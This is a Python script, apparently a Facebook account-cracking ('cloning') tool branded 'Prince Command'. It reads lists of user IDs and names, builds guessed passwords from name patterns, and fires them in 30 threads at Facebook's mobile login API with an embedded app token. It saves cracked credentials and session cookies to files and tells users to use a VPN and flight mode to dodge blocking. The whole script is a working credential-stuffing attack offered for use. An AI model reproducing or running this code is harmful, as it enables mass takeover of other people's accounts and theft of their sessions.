#pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd

os.system("git pull")

#####################    
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH:RED
H = '\x1b[1;92m' # HIJAU:GREEN
K = '\x1b[1;93m' # KUNING:YELLOW
B = '\x1b[1;94m' # BIRU:BLUE
U = '\x1b[1;95m' # UNGU:PINK
O = '\x1b[1;96m' # BIRU MUDA: Light Green
N = '\x1b[0m'    # WARNA MATI: Normal Colour
A = '\x1b[1;90m' # WARNA ABU ABU:Light Black
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU


try:
	import requests
except ImportError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')


ses = requests.Session()

id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []


##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
#________________________________________#
def clear():
	os.system("clear")
def line13():
	print(35*'•')
def line12():
	print(35*'✓')
def line11():
	print(35*'[✓]')
def line10():
	print(35*'<^>')
def line9():
	print(35*'|')
def line8():
	print(35*'∆')
def line7():
	print(35*'√')
def line6():
	print(35*'%')
def line5():
	print(35*'=')
def line4():
	print(35*':')
def line3():
	print(35*'+')
def line2():
	print(35*'*')
def line1():
	print(35*'_')
def line():
	print(35*'-')
def p(x):
	print(x)

def logo():
	logo = (f'''\x1b[1;92m
 ██████  ██████  ██ ███    ██  ██████ ███████ 
 ██   ██ ██   ██ ██ ████   ██ ██      ██      
 ██████  ██████  ██ ██ ██  ██ ██      █████   
 ██      ██   ██ ██ ██  ██ ██ ██      ██      
 ██      ██   ██ ██ ██   ████  ██████ ███████ 
╔══════════════════════════════════════╗
║        WELCOME TO PRINCE COMMAND     ║     
╚══════════════════════════════════════╝            \x1b[0m                         
╔══════════════════════════════════════╗
║\033[1;97m[+] Author     : PrinceHamzaYT        ║
║\033[1;97m[+] FACEBOOK   : PrinceHamzaYT        ║          
║\033[1;97m[+] GITHUB     : PrinceHamzaYT        ║
║\033[1;97m[+] VERSION    : 1.3                  ║
╚══════════════════════════════════════╝
----------------------------------------''')
	p(logo)

ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "



ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'

# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254","Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9)"])
	return ua

	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Program Finished ')
			p(' [•] [Prince] OK  : \x1b[1;92m%s '%(len(ok)))
			p(' \x1b[0m[•] [Prince] CP  : \x1b[1;96m%s \x1b[0m'%(len(cp)))
			line()
			input(' \x1b[0m[•] Press Enter To Go Back To Main Menu ')
			clear()
			self.menu()
	def menu(self):
		logo()
		p(' \x1b[1;96m[•]    Trial \x1b[0m')
		line()
		p(' [1] File Cracking ')
		p(" [2] All Country Best Passwords ")
		p(' [3] Join Whatsapp Group ')
		p(' [4] Follow TIKTOK ')
		p(' [5] Subscribe my Youtube ')
		p(' \x1b[1;91m[6] EXIT\x1b[0m ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			clear()
			self.methods_menu()
		if m_1 =='2':
			clear()
			print("All country 20Best Passwords")
			
			print("\x1b[1;96mfirstfirst")
			print("lastlast")
			print("firstlast")
			print("first last")
			print("First Last")
			print("firstlast123")
			print("first12")
			print("first123")
			print("first1122")
			print("first1234")
			print("first786")
			print("last12")
			print("last123")
			print("last1234")
			print("first@12")
			print("first@123")
			print("first@1234")
			print("last@12")
			print("last@123")
			print("last@1234")
			input(' [•] Press Enter To Go Back To Main Menu ')
			clear()
			self.menu()
		if m_1 =='3':
			clear()
			os.system('xdg-open https://chat.whatsapp.com/EWQJ7ZR5tgp3HpXnRVLTMb')
		if m_1 =='4':
			clear()
			os.system('xdg-open https://www.tiktok.com/@princehmzayt?_t=8dabUCuKEMM&_r=1')
		elif m_1 == '5':
			clear()
			os.system('xdg-open https://youtube.com/@princehamzayt6210/')
			sp(1)
			self.menu()
		if m_1 =='6':
			os.system("exit")
		else:
			p(' [•] Prince Program Finished   ')
			clear()
			sp(1)
			self.menu()
			
	def methods_menu(self):
		print("\x1b[1;92m██████  ██████  ██ ███    ██  ██████ ███████ ")
		print("\x1b[1;92m██   ██ ██   ██ ██ ████   ██ ██      ██      ")
		print("\x1b[1;92m█████   ██████  ██ ██ ██  ██ ██      █████   ")
		print("\x1b[1;92m██      ██   ██ ██ ██  ██ ██ ██      ██      ")
		print("\x1b[1;92m██      ██   ██ ██ ██   ████  ██████ ███████ ")
		print("╔══════════════════════════════════════╗")
		print("║       WELCOME TO PRINCE COMMAND      ║     ")
		print("╚══════════════════════════════════════╝")
		print("╔══════════════════════════════════════╗")
		print("║       Use Method 1 For New IDS       ║     ")
		print("╚══════════════════════════════════════╝")
		print("   Method 2 & 3 Still Processing")
		line5()
		p(' \x1b[0m[1] Method 1 \n ') ##[2] Method 2 \n [3] Method 3
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Select Wrong  ')
			clear()
			sp(1)
			self.methods_menu()

	def cracking(self):
		clear()
		logo()
		try:
			print("For Example /sdcard/File.txt")
			line()
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()

	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,first@123,firstlast,firstfirst Etc ')
		for n in range(plimit):
			pwx.append(input(' \x1b[1;96m[•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•] Total Clone Accounts : \x1b[1;92m %s '%(len(id)))
		print("\x1b[0m [•] Use Flight Mode Before Start Cloning")
		print(" [•] Use Auto Clicker And VPN for more OK IDS")
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r \x1b[0m[PRINCE] %s | [M1] OK/CP [\x1b[1;92m%s \x1b[0m|\x1b[1;96m %s\x1b[0m] '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=sIWzZGcG1WMEl0QFpTb7eHN-; sb=sIWzZLluwacvNRUqUcGtWhNU',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[PRINCE-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/PRINCE_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/PRINCE_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					
					p('\r\x1b[1;96m[PRINCE-CP] %s | %s  '%(uid,pw))
					
					cp.append(uid)
					open('/sdcard/PRINCE_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)

	def method2(self,uid,nm,pwx):
		#YE METHOD 2 HE
		print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
		exit()

	def method3(self,uid,nm,pwx):
		#YE METHOD 3 HE
		print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
		exit()

		exit()
if __name__=="__main__":
	Main().menu()